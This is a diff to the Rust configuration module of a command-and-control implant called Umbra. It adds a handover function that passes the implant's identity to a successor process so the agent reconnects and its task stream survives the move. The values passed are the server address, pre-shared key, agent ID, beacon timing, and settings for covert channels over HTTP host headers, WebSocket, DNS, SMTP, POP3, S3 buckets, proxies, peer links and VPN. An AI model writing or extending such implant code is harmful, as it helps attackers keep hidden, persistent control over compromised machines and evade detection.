@@ -314,4 +314,89 @@ impl Config {
             s3_results_bucket: pick("UMBRA_S3_RESULTS_BUCKET", "umbra-results"),
         })
     }
+
+    /// The environment a process that takes over the work of the implant
+    /// inherits.
+    ///
+    /// The list carries the identity of the agent and the address of the
+    /// server, so the process that takes over reconnects as the same agent
+    /// and the task stream survives the move.  The key travels with it:
+    /// the new process cannot talk to the server without it.
+    pub fn handover(&self) -> Vec<(String, String)> {
+        let mut env: Vec<(String, String)> = vec![
+            ("UMBRA_SERVER".to_string(), self.server.clone()),
+            ("UMBRA_TRANSPORT".to_string(), self.transport.name().to_string()),
+            ("UMBRA_PSK".to_string(), hex_encode(&self.psk)),
+            ("UMBRA_AGENT_ID".to_string(), self.agent_id.clone()),
+            ("UMBRA_SLEEP".to_string(), self.sleep.to_string()),
+            ("UMBRA_JITTER".to_string(), self.jitter.to_string()),
+        ];
+        if !self.http_path.is_empty() {
+            env.push(("UMBRA_HTTP_PATH".to_string(), self.http_path.clone()));
+        }
+        if !self.http_host_header.is_empty() {
+            env.push((
+                "UMBRA_HTTP_HOST_HEADER".to_string(),
+                self.http_host_header.clone(),
+            ));
+        }
+        if self.http_pad > 0 {
+            env.push(("UMBRA_HTTP_PAD".to_string(), self.http_pad.to_string()));
+        }
+        if !self.ws_path.is_empty() {
+            env.push(("UMBRA_WS_PATH".to_string(), self.ws_path.clone()));
+        }
+        if !self.ws_host_header.is_empty() {
+            env.push((
+                "UMBRA_WS_HOST_HEADER".to_string(),
+                self.ws_host_header.clone(),
+            ));
+        }
+        if !self.dns_resolver.is_empty() {
+            env.push(("UMBRA_DNS_RESOLVER".to_string(), self.dns_resolver.clone()));
+        }
+        if !self.dns_domain.is_empty() {
+            env.push(("UMBRA_DNS_DOMAIN".to_string(), self.dns_domain.clone()));
+        }
+        if !self.smtp_addr.is_empty() {
+            env.push(("UMBRA_SMTP_ADDR".to_string(), self.smtp_addr.clone()));
+        }
+        if !self.pop3_addr.is_empty() {
+            env.push(("UMBRA_POP3_ADDR".to_string(), self.pop3_addr.clone()));
+        }
+        if !self.s3_endpoint.is_empty() {
+            env.push(("UMBRA_S3_ENDPOINT".to_string(), self.s3_endpoint.clone()));
+        }
+        if !self.s3_region.is_empty() {
+            env.push(("UMBRA_S3_REGION".to_string(), self.s3_region.clone()));
+        }
+        if !self.s3_tasks_bucket.is_empty() {
+            env.push((
+                "UMBRA_S3_TASKS_BUCKET".to_string(),
+                self.s3_tasks_bucket.clone(),
+            ));
+        }
+        if !self.s3_results_bucket.is_empty() {
+            env.push((
+                "UMBRA_S3_RESULTS_BUCKET".to_string(),
+                self.s3_results_bucket.clone(),
+            ));
+        }
+        if !self.proxy.is_empty() {
+            env.push(("UMBRA_PROXY".to_string(), self.proxy.clone()));
+        }
+        if !self.servers.is_empty() {
+            env.push(("UMBRA_SERVERS".to_string(), self.servers.join(",")));
+        }
+        if !self.peer_listen.is_empty() {
+            env.push((
+                "UMBRA_PEER_LISTEN".to_string(),
+                self.peer_listen.clone(),
+            ));
+        }
+        if !self.vpn_addr.is_empty() {
+            env.push(("UMBRA_VPN_ADDR".to_string(), self.vpn_addr.clone()));
+        }
+        env
+    }
 }
